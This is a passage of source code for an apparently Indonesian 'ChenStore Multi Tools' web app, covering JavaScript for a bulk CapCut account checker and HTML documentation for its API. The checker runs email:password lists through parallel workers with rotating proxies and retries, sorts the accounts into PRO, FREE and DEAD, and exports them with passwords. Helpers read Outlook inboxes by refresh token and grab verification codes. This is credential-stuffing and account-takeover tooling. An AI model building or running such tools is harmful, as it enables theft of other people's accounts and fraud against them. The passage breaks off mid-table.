              </div>
              <button class="btn btn-gold px-3 py-2 fw-bold shadow-sm" onclick="copyOtpDirect('${otp}', event)">
                <i class="fa-regular fa-copy me-1"></i> ${getI18nText('tm_btn_copy_otp', 'Salin OTP')}
              </button>
            </div>
          `;
        }

        reader.innerHTML = `
          ${otpHtml}
          <h4 class="fw-bold text-warning mb-2">"${escapeHtml(data.subject)}"</h4>
          
          <div class="tm-meta-card">
            <div class="row g-2 small">
              <div class="col-sm-2 text-warning fw-bold">FROM</div>
              <div class="col-sm-10 text-light">${escapeHtml(data.from)}</div>
              <div class="col-sm-2 text-warning fw-bold">TO</div>
              <div class="col-sm-10 text-light">${escapeHtml(data.to || acc.email)}</div>
              <div class="col-sm-2 text-warning fw-bold">DATE</div>
              <div class="col-sm-10 text-light">${escapeHtml(data.date)}</div>
            </div>
          </div>

          <div class="tm-email-iframe-container flex-grow-1">
            <iframe class="tm-email-iframe" srcdoc="${escapeHtml(data.body)}"></iframe>
          </div>
        `;
      } catch (err) {
        let errDesc = 'Email / Token Invalid atau Gagal Memuat Surat';
        reader.innerHTML = `<div class="text-center text-danger my-auto"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
        showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
      }
    }

    function escapeHtml(str) {
      return (str || '').replace(/"/g, '&quot;');
    }

    function refreshCurrentInbox() {
      if (selectedAccountIndex >= 0) {
        loadInboxMessages(outlookAccounts[selectedAccountIndex]);
      }
    }

    function copyCurrentEmail() {
      if (selectedAccountIndex >= 0 && outlookAccounts[selectedAccountIndex]) {
        const email = outlookAccounts[selectedAccountIndex].email;
        if (email) {
          copyToClipboard(email, '✓ ' + getI18nText('tm_copied', 'Disalin!') + ': ' + email, 'fa-solid fa-envelope text-warning');
        }
      }
    }

    let capcutRecords = [];
    let capcutAbortController = null;

    function updateCapcutCount() {
      const el = document.getElementById('ccAccountsInput');
      const countEl = document.getElementById('ccAccountCount');
      if (el && countEl) {
        const lines = el.value.split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l.length > 0);
        countEl.textContent = 'Total: ' + lines.length + ' accounts';
      }
    }

    const ccAccountsInput = document.getElementById('ccAccountsInput');
    if (ccAccountsInput) {
      ccAccountsInput.addEventListener('input', updateCapcutCount);
    }

    function clearCapcutInput() {
      const el = document.getElementById('ccAccountsInput');
      if (el) el.value = '';
      updateCapcutCount();
    }

    function clearCapcutResults() {
      document.getElementById('proResult').value = '';
      document.getElementById('freeResult').value = '';
      document.getElementById('dieResult').value = '';
      document.getElementById('proCount').textContent = '0';
      document.getElementById('freeCount').textContent = '0';
      document.getElementById('dieCount').textContent = '0';
      document.getElementById('ccProgressText').textContent = '0 / 0 (0%)';
      document.getElementById('ccProgressBar').style.width = '0%';
      capcutRecords = [];
    }

    function exportCapcutResults(type) {
      let content = '', filename = '', mimeType = '';

      if (type === 'json') {
        content = JSON.stringify(capcutRecords, null, 2);
        filename = 'capcut_results.json';
        mimeType = 'application/json;charset=utf-8;';
      } else if (type === 'csv') {
        const headers = ['Email', 'Password', 'Status', 'User ID', 'Plan', 'Expiry', 'Error'];
        const rows = capcutRecords.map(r => [
          r.email,
          r.password,
          r.status,
          r.user_id || '',
          r.is_pro ? 'PRO' : (r.ok ? 'FREE' : 'DEAD'),
          r.expiry || '',
          r.error || ''
        ].map(val => `"${(val || '').toString().replace(/"/g, '""')}"`).join(','));
        content = [headers.join(','), ...rows].join(String.fromCharCode(13, 10));
        filename = 'capcut_results.csv';
        mimeType = 'text/csv;charset=utf-8;';
      } else {
        const pro = document.getElementById('proResult').value.trim();
        const free = document.getElementById('freeResult').value.trim();
        const die = document.getElementById('dieResult').value.trim();
        content = '=== PRO ACCOUNTS ===' + String.fromCharCode(10) + pro + String.fromCharCode(10, 10) + '=== FREE ACCOUNTS ===' + String.fromCharCode(10) + free + String.fromCharCode(10, 10) + '=== DEAD ACCOUNTS ===' + String.fromCharCode(10) + die + String.fromCharCode(10);
        filename = 'capcut_results.txt';
        mimeType = 'text/plain;charset=utf-8;';
      }

      const blob = new Blob([content], { type: mimeType });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = filename;
      link.click();
    }

    function downloadCapcutAll(format) {
      return exportCapcutResults(format);
    }

    let capcutTotalBytesUsed = 0;
    function resetCapcutProxyUsage() {
      capcutTotalBytesUsed = 0;
      const b = document.getElementById('ccProxyUsageBadge');
      if (b) b.textContent = '0 B';
      showToast('Counter kuota proxy CapCut direset.', 'fa-solid fa-rotate-left text-info');
    }

    async function startCapcutChecking() {
      const text = ccAccountsInput.value.trim();
      const proxy = document.getElementById('ccProxyInput').value.trim();
      const workers = parseInt(document.getElementById('ccWorkersInput').value) || 6;
      const retries = parseInt(document.getElementById('ccRetriesInput').value) || 6;

      if (!text) return showToast(getI18nText('cc_alert_empty', 'Silakan masukkan daftar akun CapCut!'), 'fa-solid fa-triangle-exclamation text-warning');

      document.getElementById('proResult').value = '';
      document.getElementById('freeResult').value = '';
      document.getElementById('dieResult').value = '';
      document.getElementById('proCount').textContent = '0';
      document.getElementById('freeCount').textContent = '0';
      document.getElementById('dieCount').textContent = '0';
      capcutRecords = [];

      let countPro = 0, countFree = 0, countDie = 0, checked = 0;
      document.getElementById('btnStartCapcut').disabled = true;
      document.getElementById('btnStopCapcut').disabled = false;
      capcutAbortController = new AbortController();
      const ccProxyBadge = document.getElementById('ccProxyUsageBadge');

      try {
        let accounts = parseCapcutLinesJS(text);
        if (accounts.length === 0) {
          try {
            accounts = await safeFetchJson('/api/parse_accounts', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ text: text, mode: 'capcut' })
            });
          } catch(e) {}
        }
        const total = accounts ? accounts.length : 0;

        if (total === 0) {
          showToast(getI18nText('cc_alert_no_valid', 'Tidak ada akun valid yang ditemukan!'), 'fa-solid fa-triangle-exclamation text-warning');
          document.getElementById('btnStartCapcut').disabled = false;
          document.getElementById('btnStopCapcut').disabled = true;
          return;
        }

        const pBox = document.getElementById('ccProgressBox'); if (pBox) pBox.style.display = 'block';
        document.getElementById('ccProgressText').textContent = `0 / ${total} (0%)`;
        document.getElementById('ccProgressBar').style.width = '0%';

        let currentIndex = 0;
        async function worker() {
          while (currentIndex < total) {
            if (capcutAbortController.signal.aborted) break;
            const idx = currentIndex++;
            const acc = accounts[idx];

            try {
              const r = await safeFetchJson('/api/check_single_capcut', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: acc.email, password: acc.password, proxy: proxy, retries: retries }),
                signal: capcutAbortController.signal
              });
              checked++;
              capcutRecords.push(r);

              if (r && r.bytes_used) {
                capcutTotalBytesUsed += r.bytes_used;
                if (ccProxyBadge) ccProxyBadge.textContent = formatBytes(capcutTotalBytesUsed);
              }

              const uidStr = r.user_id ? ` | UID: ${r.user_id}` : '';

              if (r.ok && r.is_pro) {
                countPro++;
                document.getElementById('proCount').textContent = countPro;
                const exp = r.expiry ? ` | Exp: ${r.expiry}` : '';
                document.getElementById('proResult').value += `${r.email}:${r.password}${uidStr}${exp}` + String.fromCharCode(10);
              } else if (r.ok && !r.is_pro) {
                countFree++;
                document.getElementById('freeCount').textContent = countFree;
                document.getElementById('freeResult').value += `${r.email}:${r.password}${uidStr} | Free Plan` + String.fromCharCode(10);
              } else {
                countDie++;
                document.getElementById('dieCount').textContent = countDie;
                const err = r.error ? ` [${r.error}]` : '';
                document.getElementById('dieResult').value += `${r.email}:${r.password}${err}` + String.fromCharCode(10);
              }

              const percent = Math.round((checked / total) * 100);
              document.getElementById('ccProgressText').textContent = `${checked} / ${total} (${percent}%)`;
              document.getElementById('ccProgressBar').style.width = `${percent}%`;
            } catch (e) {
              if (e.name === 'AbortError') break;
              checked++;
              countDie++;
              document.getElementById('dieCount').textContent = countDie;
              document.getElementById('dieResult').value += `${acc.email}:${acc.password} [${e.message}]` + String.fromCharCode(10);
              const percent = Math.round((checked / total) * 100);
              document.getElementById('ccProgressText').textContent = `${checked} / ${total} (${percent}%)`;
              document.getElementById('ccProgressBar').style.width = `${percent}%`;
            }
          }
        }

        const pool = [];
        for (let i = 0; i < Math.min(workers, total); i++) {
          pool.push(worker());
        }
        await Promise.all(pool);

      } catch (err) {
        if (err.name !== 'AbortError') showToast('Error: ' + err.message, 'fa-solid fa-circle-xmark text-danger');
      } finally {
        document.getElementById('btnStartCapcut').disabled = false;
        document.getElementById('btnStopCapcut').disabled = true;
      }
    }

    function stopCapcutChecking() {
      if (capcutAbortController) capcutAbortController.abort();
      document.getElementById('btnStartCapcut').disabled = false;
      document.getElementById('btnStopCapcut').disabled = true;
    }

    // Load saved accounts & i18n on startup and attach tab handlers
    document.addEventListener('DOMContentLoaded', () => {
      // Load stored language preference or default to ID
      let savedLang = 'id';
      try {
        savedLang = localStorage.getItem('chenstore_app_lang') || 'id';
      } catch(e) {}
      setAppLanguage(savedLang);

      // Cleanup any stuck modal backdrops
      document.querySelectorAll('.modal-backdrop').forEach(b => b.remove());
      document.body.classList.remove('modal-open');

      // Auto-clear & focus Add Account Modal inputs whenever opened
      const addModalEl = document.getElementById('addAccountModal');
      if (addModalEl) {
        addModalEl.addEventListener('show.bs.modal', function () {
          const inputEl = document.getElementById('modalAccountInput');
          if (inputEl) inputEl.value = '';
          const fileEl = document.getElementById('modalFileInput');
          if (fileEl) fileEl.value = '';
          const proxyEl = document.getElementById('modalProxyInput');
          if (proxyEl) proxyEl.value = '';
        });
        addModalEl.addEventListener('shown.bs.modal', function () {
          const inputEl = document.getElementById('modalAccountInput');
          if (inputEl) inputEl.focus();
        });
      }

      loadOutlookAccountsStorage();
    });
  </script>
  <div id="chenToastContainer"></div>
  
  <!-- Fixed Bottom-Left Subtle Transparent Watermark -->
  <div class="chen-powered-watermark">
    <i class="fa-solid fa-bolt"></i>
    <span>Powered by <span class="powered-brand">ChenStore</span></span>
  </div>
</body>
</html>
"""

# ==================== API DOCS HTML TEMPLATE ====================
DOCS_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>API Documentation | ChenStore Multi Tools</title>
  <link rel="icon" type="image/png" href="data:image/png;base64,{{ favicon_b64 }}">
  <link rel="shortcut icon" type="image/png" href="data:image/png;base64,{{ favicon_b64 }}">
  <link rel="apple-touch-icon" href="data:image/png;base64,{{ favicon_b64 }}">
  <link rel="icon" type="image/png" href="/logo.png">
  <link rel="manifest" href="/manifest.json">
  <meta name="theme-color" content="#0f0a06">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&display=swap');

    :root {
      --bg-dark: #0f0a06;
      --bg-sidebar: #140d07;
      --bg-card: #18110b;
      --border-bronze: #382415;
      --border-gold: #b45309;
      --gold-main: #f59e0b;
      --gold-light: #fef08a;
      --gold-glow: rgba(245, 158, 11, 0.35);
      --text-main: #fef3c7;
      --text-muted: #a89f91;
    }

    body {
      background-color: var(--bg-dark);
      color: var(--text-main);
      font-family: 'Plus Jakarta Sans', system-ui, sans-serif;
      margin: 0;
      padding: 0;
    }

    /* Top Navbar */
    .docs-topbar {
      background-color: var(--bg-sidebar);
      border-bottom: 2px solid var(--border-bronze);
      padding: 10px 24px;
      position: sticky;
      top: 0;
      z-index: 1030;
      display: flex;
      align-items: center;
      justify-content: space-between;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
    }
    .brand-title {
      font-family: 'Cinzel', serif;
      font-weight: 800;
      font-size: 1.2rem;
      background: linear-gradient(180deg, #fffbeb 0%, #fcd34d 50%, #d97706 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    /* Layout */
    .docs-container {
      display: flex;
      min-height: calc(100vh - 65px);
    }

    /* Left Sidebar */
    .docs-sidebar {
      width: 280px;
      background-color: var(--bg-sidebar);
      border-right: 1px solid var(--border-bronze);
      padding: 20px 14px;
      position: sticky;
      top: 65px;
      height: calc(100vh - 65px);
      overflow-y: auto;
      flex-shrink: 0;
    }
    .docs-nav-group {
      margin-bottom: 20px;
    }
    .docs-group-title {
      font-size: 0.72rem;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: #b45309;
      font-weight: 800;
      margin-bottom: 8px;
      padding-left: 10px;
    }
    .docs-nav-link {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 7px 12px;
      color: var(--text-muted);
      text-decoration: none;
      font-size: 0.83rem;
      font-weight: 600;
      border-radius: 6px;
      transition: all 0.15s;
    }
    .docs-nav-link:hover {
      color: var(--gold-light);
      background-color: #24160d;
    }
    .docs-nav-link.active {
      color: #180f07 !important;
      background: linear-gradient(135deg, #fcd34d 0%, #f59e0b 100%);
      font-weight: 700;
      box-shadow: 0 2px 8px var(--gold-glow);
    }
    .docs-nav-link .badge-method {
      font-size: 0.65rem;
      padding: 2px 6px;
      border-radius: 4px;
      font-weight: 800;
      font-family: 'Fira Code', monospace;
    }

    /* Main Content */
    .docs-content {
      flex: 1;
      padding: 36px 48px;
      max-width: 1050px;
      overflow-y: auto;
    }

    .doc-section {
      margin-bottom: 48px;
      scroll-margin-top: 85px;
    }
    .doc-section-title {
      font-size: 1.6rem;
      font-weight: 800;
      color: #fcd34d;
      margin-bottom: 12px;
      padding-bottom: 8px;
      border-bottom: 1px solid var(--border-bronze);
    }
    .doc-card {
      background-color: var(--bg-card);
      border: 1px solid var(--border-bronze);
      border-radius: 12px;
      padding: 24px;
      margin-bottom: 24px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }

    /* Method Badges */
    .badge-post { background-color: #059669; color: #ffffff; }
    .badge-get { background-color: #0284c7; color: #ffffff; }

    /* Tables */
    .table-theme {
      color: var(--text-main);
      border-color: var(--border-bronze);
      font-size: 0.85rem;
    }
    .table-theme th {
      background-color: #120b06;
      color: var(--gold-main);
      font-weight: 700;
      border-color: var(--border-bronze);
    }
    .table-theme td {
      background-color: #18110b;
      border-color: #2b1a0d;
      vertical-align: middle;
    }

    /* Code Blocks */
    .code-container {
      background-color: #0a0603;
      border: 1px solid var(--border-bronze);
      border-radius: 8px;
      overflow: hidden;
      margin-top: 10px;
      margin-bottom: 16px;
    }
    .code-header {
      background-color: #140d07;
      border-bottom: 1px solid var(--border-bronze);
      padding: 6px 14px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.75rem;
      font-weight: 600;
      color: var(--gold-main);
    }
    .code-block {
      padding: 14px;
      margin: 0;
      font-family: 'Fira Code', monospace;
      font-size: 0.82rem;
      color: #fef3c7;
      overflow-x: auto;
      white-space: pre;
    }

    .btn-gold {
      background: linear-gradient(135deg, #d97706 0%, #f59e0b 100%);
      color: #180f07;
      font-weight: 700;
      border: none;
    }
    .btn-gold:hover {
      background: linear-gradient(135deg, #b45309 0%, #d97706 100%);
      color: #ffffff;
    }

    @media (max-width: 991px) {
      .docs-container { flex-direction: column; }
      .docs-sidebar {
        width: 100%;
        height: auto;
        position: static;
        border-right: none;
        border-bottom: 1px solid var(--border-bronze);
      }
      .docs-content { padding: 20px 14px; }
    }
  </style>
</head>
<body>

  <!-- Top Navbar -->
  <header class="docs-topbar">
    <div class="d-flex align-items-center gap-3">
      <img src="/logo.png" data-fallback="data:image/png;base64,{{ favicon_b64 }}" alt="ChenStore" style="height: 38px; border-radius: 6px; border: 1px solid #78471c;" onerror="if(this.dataset.fallback && this.src !== this.dataset.fallback){this.src=this.dataset.fallback;}else{this.style.display='none';}">
      <div>
        <div class="brand-title">ChenStore API Docs</div>
        <div class="small text-secondary" style="font-size: 0.7rem; letter-spacing: 1px;">REST API REFERENCE FOR DEVELOPERS</div>
      </div>
    </div>
    <div class="d-flex gap-2">
      <a href="/" class="btn btn-sm btn-gold px-3">
        <i class="fa-solid fa-arrow-left me-1"></i> Dashboard App
      </a>
    </div>
  </header>

  <div class="docs-container">
    
    <!-- Sidebar Navigation -->
    <nav class="docs-sidebar">
      <div class="docs-nav-group">
        <div class="docs-group-title">GETTING STARTED</div>
        <a class="docs-nav-link" href="#overview"><i class="fa-solid fa-bolt me-1 text-warning"></i>Overview &amp; Base URL</a>
        <a class="docs-nav-link" href="#authentication"><i class="fa-solid fa-shield-halved me-1 text-warning"></i>Request &amp; Auth</a>
      </div>

      <div class="docs-nav-group">
        <div class="docs-group-title">MAIL &amp; OUTLOOK API</div>
        <a class="docs-nav-link" href="#ep-check-outlook"><span class="badge badge-method badge-post">POST</span> /api/check_single_outlook</a>
        <a class="docs-nav-link" href="#ep-mail-inbox"><span class="badge badge-method badge-post">POST</span> /api/mail/inbox</a>
        <a class="docs-nav-link" href="#ep-mail-message"><span class="badge badge-method badge-post">POST</span> /api/mail/message</a>
      </div>

      <div class="docs-nav-group">
        <div class="docs-group-title">CAPCUT CHECKER API</div>
        <a class="docs-nav-link" href="#ep-check-capcut"><span class="badge badge-method badge-post">POST</span> /api/check_single_capcut</a>
        <a class="docs-nav-link" href="#ep-bulk-capcut"><span class="badge badge-method badge-post">POST</span> /api/check (Bulk Stream)</a>
      </div>

      <div class="docs-nav-group">
        <div class="docs-group-title">2FA TOTP API</div>
        <a class="docs-nav-link" href="#ep-2fa-generate"><span class="badge badge-method badge-post">POST</span> /api/2fa/generate</a>
      </div>

      <div class="docs-nav-group">
        <div class="docs-group-title">PROXY CHECKER API</div>
        <a class="docs-nav-link" href="#ep-check-proxy"><span class="badge badge-method badge-post">POST</span> /api/check_single_proxy</a>
      </div>

      <div class="docs-nav-group">
        <div class="docs-group-title">PARSER HELPER API</div>
        <a class="docs-nav-link" href="#ep-parse-accounts"><span class="badge badge-method badge-post">POST</span> /api/parse_accounts</a>
      </div>
    </nav>

    <!-- Main Content Area -->
    <main class="docs-content">
      
      <!-- Section: Overview -->
      <section id="overview" class="doc-section">
        <h2 class="doc-section-title">Overview &amp; Base URL</h2>
        <p class="text-secondary">
          Selamat datang di <b>ChenStore Multi Tools Developer API</b>. Semua endpoint REST API dirancang untuk integrasi mudah menggunakan format payload JSON standar.
        </p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2"><i class="fa-solid fa-server me-2"></i>Base URL</h6>
          <p class="text-secondary small mb-2">Semua request API dapat diarahkan ke Base URL domain Anda:</p>
          <div class="code-container">
            <div class="code-header">
              <span>BASE API URL</span>
              <button class="btn btn-xs btn-outline-warning py-0 px-2" onclick="copyCode(this)">Copy</button>
            </div>
            <pre class="code-block"><span id="baseUrlDisplay">https://your-domain.vercel.app</span>/api</pre>
          </div>
        </div>
      </section>

      <!-- Section: Authentication -->
      <section id="authentication" class="doc-section">
        <h2 class="doc-section-title">Request &amp; Header Format</h2>
        <div class="doc-card">
          <p class="text-secondary small">Pastikan setiap request POST menyertakan header <code>Content-Type: application/json</code>:</p>
          <div class="table-responsive">
            <table class="table table-theme table-bordered">
              <thead>
                <tr>
                  <th>Header</th>
                  <th>Value</th>
                  <th>Description</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td class="font-monospace text-warning">Content-Type</td>
                  <td class="font-monospace text-light">application/json</td>
                  <td>Format data request body JSON</td>
                </tr>
                <tr>
                  <td class="font-monospace text-warning">Accept</td>
                  <td class="font-monospace text-light">application/json</td>
                  <td>Format respon yang diharapkan</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </section>

      <!-- Endpoint: Check Single Outlook -->
      <section id="ep-check-outlook" class="doc-section">
        <h2 class="doc-section-title"><span class="badge badge-post fs-6 me-2">POST</span> /api/check_single_outlook</h2>
        <p class="text-secondary">Memvalidasi status akun Hotmail/Outlook (LIVE/DEAD) menggunakan OAuth Refresh Token dan mengambil subjek email terbaru.</p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2">Request Body (JSON)</h6>
          <div class="table-responsive mb-3">
            <table class="table table-theme table-bordered">
              <thead>
                <tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr>
              </thead>
              <tbody>
                <tr><td class="font-monospace text-warning">refresh_token</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>Microsoft OAuth2 Refresh Token (M.C555_... atau M.R3_...)</td></tr>
                <tr><td class="font-monospace text-warning">email</td><td>string</td><td>Opsional</td><td>Alamat email Hotmail / Outlook</td></tr>
                <tr><td class="font-monospace text-warning">client_id</td><td>string</td><td>Opsional</td><td>Default: <code>9e5f94bc-e8a4-4e73-b8be-63364c29d753</code></td></tr>
                <tr><td class="font-monospace text-warning">proxy</td><td>string</td><td>Opsional</td><td>Proxy URL: <code>http://user:pass@host:port</code></td></tr>
              </tbody>
            </table>
          </div>

          <h6 class="fw-bold text-warning mb-2">Example Response (JSON)</h6>
          <div class="code-container">
            <div class="code-header"><span>200 OK Response</span><button class="btn btn-xs btn-outline-warning py-0 px-2" onclick="copyCode(this)">Copy</button></div>
            <pre class="code-block">{
  "ok": true,
  "status": "LIVE",
  "email": "user@hotmail.com",
  "latest_subject": "Welcome to CapCut and your verification code is 829587",
  "latest_from": "CapCut",
  "latest_date": "2026-07-20",
  "error": ""
}</pre>
          </div>
        </div>
      </section>

      <!-- Endpoint: Mail Inbox -->
      <section id="ep-mail-inbox" class="doc-section">
        <h2 class="doc-section-title"><span class="badge badge-post fs-6 me-2">POST</span> /api/mail/inbox</h2>
        <p class="text-secondary">Mengambil daftar pesan kotak masuk (inbox) terbaru beserta preview dan status keterbacaan.</p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2">Request Body (JSON)</h6>
          <div class="table-responsive mb-3">
            <table class="table table-theme table-bordered">
              <thead>
                <tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr>
              </thead>
              <tbody>
                <tr><td class="font-monospace text-warning">refresh_token</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>Microsoft OAuth2 Refresh Token</td></tr>
                <tr><td class="font-monospace text-warning">client_id</td><td>string</td><td>Opsional</td><td>Default: <code>9e5f94bc-e8a4-4e73-b8be-63364c29d753</code></td></tr>
              </tbody>
            </table>
          </div>

          <h6 class="fw-bold text-warning mb-2">Example Response (JSON)</h6>
          <div class="code-container">
            <div class="code-header"><span>200 OK Response</span><button class="btn btn-xs btn-outline-warning py-0 px-2" onclick="copyCode(this)">Copy</button></div>
            <pre class="code-block">{
  "ok": true,
  "messages": [
    {
      "id": "AAMkAD...",
      "subject": "Kode verifikasi CapCut Anda adalah 463394",
      "sender_name": "CapCut",
      "sender_email": "verify@capcut.com",
      "preview": "Gunakan kode ini untuk menyelesaikan verifikasi...",
      "time_display": "5m lalu",
      "raw_date": "2026-07-20T10:15:30Z",
      "is_read": false
    }
  ]
}</pre>
          </div>
        </div>
      </section>

      <!-- Endpoint: Mail Message Detail -->
      <section id="ep-mail-message" class="doc-section">
        <h2 class="doc-section-title"><span class="badge badge-post fs-6 me-2">POST</span> /api/mail/message</h2>
        <p class="text-secondary">Mengambil detail lengkap isi surat email (HTML Body, from, to, date) berdasarkan Message ID.</p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2">Request Body (JSON)</h6>
          <div class="table-responsive mb-3">
            <table class="table table-theme table-bordered">
              <thead>
                <tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr>
              </thead>
              <tbody>
                <tr><td class="font-monospace text-warning">message_id</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>ID Pesan dari respon <code>/api/mail/inbox</code></td></tr>
                <tr><td class="font-monospace text-warning">refresh_token</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>Microsoft OAuth2 Refresh Token</td></tr>
              </tbody>
            </table>
          </div>

          <h6 class="fw-bold text-warning mb-2">Example Response (JSON)</h6>
          <div class="code-container">
            <div class="code-header"><span>200 OK Response</span><button class="btn btn-xs btn-outline-warning py-0 px-2" onclick="copyCode(this)">Copy</button></div>
            <pre class="code-block">{
  "ok": true,
  "id": "AAMkAD...",
  "subject": "Kode verifikasi CapCut Anda adalah 463394",
  "from": "CapCut <verify@capcut.com>",
  "to": "user@hotmail.com",
  "date": "20 Jul 2026, 17:15",
  "body": "<html><body>...  <div id="chenToastContainer"></div>
</body></html>",
  "body_type": "html"
}</pre>
          </div>
        </div>
      </section>

      <!-- Endpoint: Check Single CapCut -->
      <section id="ep-check-capcut" class="doc-section">
        <h2 class="doc-section-title"><span class="badge badge-post fs-6 me-2">POST</span> /api/check_single_capcut</h2>
        <p class="text-secondary">Memvalidasi login akun CapCut dan memeriksa status langganan PRO / VIP / FREE serta masa aktifnya.</p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2">Request Body (JSON)</h6>
          <div class="table-responsive mb-3">
            <table class="table table-theme table-bordered">
              <thead>
                <tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr>
              </thead>
              <tbody>
                <tr><td class="font-monospace text-warning">email</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>Email akun CapCut</td></tr>
                <tr><td class="font-monospace text-warning">password</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>Password akun CapCut</td></tr>
                <tr><td class="font-monospace text-warning">proxy</td><td>string</td><td>Opsional</td><td>Residential Proxy URL (format <code>{sess}</code>)</td></tr>
                <tr><td class="font-monospace text-warning">retries</td><td>int</td><td>Opsional</td><td>Maksimal percobaan IP (default: 6)</td></tr>
              </tbody>
            </table>
          </div>

          <h6 class="fw-bold text-warning mb-2">Example Response (JSON)</h6>
          <div class="code-container">
            <div class="code-header"><span>200 OK Response</span><button class="btn btn-xs btn-outline-warning py-0 px-2" onclick="copyCode(this)">Copy</button></div>
            <pre class="code-block">{
  "ok": true,
  "status": "PRO",
  "email": "user@example.com",
  "password": "password123",
  "is_pro": true,
  "plan": "Pro (vip)",
  "expiry": "2026-12-31",
  "user_id": "7182930491823",
  "error": ""
}</pre>
          </div>
        </div>
      </section>

      <!-- Endpoint: 2FA Generate -->
      <section id="ep-2fa-generate" class="doc-section">
        <h2 class="doc-section-title"><span class="badge badge-post fs-6 me-2">POST</span> /api/2fa/generate</h2>
        <p class="text-secondary">Menghasilkan kode verifikasi TOTP (Google Authenticator) 6 digit instan dari 1 atau banyak Secret Key (Base32).</p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2">Request Body (JSON)</h6>
          <div class="table-responsive mb-3">
            <table class="table table-theme table-bordered">
              <thead>
                <tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr>
              </thead>
              <tbody>
                <tr><td class="font-monospace text-warning">secrets</td><td>array</td><td><span class="badge bg-danger">Wajib</span></td><td>Array berisi Base32 Secret Keys, misal <code>["JBSWY3DPEHPK3PXP", "4X72J6..."]</code></td></tr>
              </tbody>
            </table>
          </div>

          <h6 class="fw-bold text-warning mb-2">Example Response (JSON)</h6>
          <div class="code-container">
            <div class="code-header"><span>200 OK Response</span><button class="btn btn-xs btn-outline-warning py-0 px-2" onclick="copyCode(this)">Copy</button></div>
            <pre class="code-block">{
  "ok": true,
  "data": [
    {
      "secret": "JBSWY3DPEHPK3PXP",
      "code": "849201",
      "error": ""
    }
  ]
}</pre>
          </div>
        </div>
      </section>

      <!-- Endpoint: Proxy Check -->
      <section id="ep-check-proxy" class="doc-section">
        <h2 class="doc-section-title"><span class="badge badge-post fs-6 me-2">POST</span> /api/check_single_proxy</h2>
        <p class="text-secondary">Menguji konektivitas proxy, mengukur latency ping (ms), melacak exit IP &amp; Geolocation, serta Scamalytics Fraud Score.</p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2">Request Body (JSON)</h6>
          <div class="table-responsive mb-3">
            <table class="table table-theme table-bordered">
              <thead>
                <tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr>
              </thead>
              <tbody>
                <tr><td class="font-monospace text-warning">proxy</td><td>string</td><td><span class="badge bg-danger">Wajib</span></td><td>Format: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, atau <code>USER:PASS:HOST:PORT</code></td></tr>
                <tr><td class="font-monospace text-warning">timeout</td><td>float</td><td>Opsional</td><td>Timeout detik (default: 8.0)</td></tr>
                <tr><td class="font-monospace text-warning">check_scamalytics</td><td>bool</td><td>Opsional</td><td>Set <code>true</code> untuk cek Fraud Score (default: false)</td></tr>
              </tbody>
            </table>
          </div>

          <h6 class="fw-bold text-warning mb-2">Example Response (JSON)</h6>
          <div class="code-container">
            <div class="code-header"><span>200 OK Response</span><button class="btn btn-xs btn-outline-warning py-0 px-2" onclick="copyCode(this)">Copy</button></div>
            <pre class="code-block">{
  "ok": true,
  "live": true,
  "latency_ms": 142,
  "exit_ip": "104.28.19.45",
  "country": "United States",
  "country_code": "US",
  "city": "Los Angeles",
  "isp": "Cloudflare, Inc.",
  "fraud_score": 0,
  "fraud_risk": "very low"
}</pre>
          </div>
        </div>
      </section>

      <!-- Endpoint: Parse Accounts -->
      <section id="ep-parse-accounts" class="doc-section">
        <h2 class="doc-section-title"><span class="badge badge-post fs-6 me-2">POST</span> /api/parse_accounts</h2>
        <p class="text-secondary">Mem-parsing teks mentah multiline menjadi daftar akun JSON terstruktur untuk CapCut atau Outlook.</p>

        <div class="doc-card">
          <h6 class="fw-bold text-warning mb-2">Request Body (JSON)</h6>
          <div class="table-responsive mb-3">
            <table class="table table-theme table-bordered">
              <thead>
                <tr><th>Field</th><th>Type</th><th>Required</th><th>Description</th></tr>
              </thead>
              <tbody>
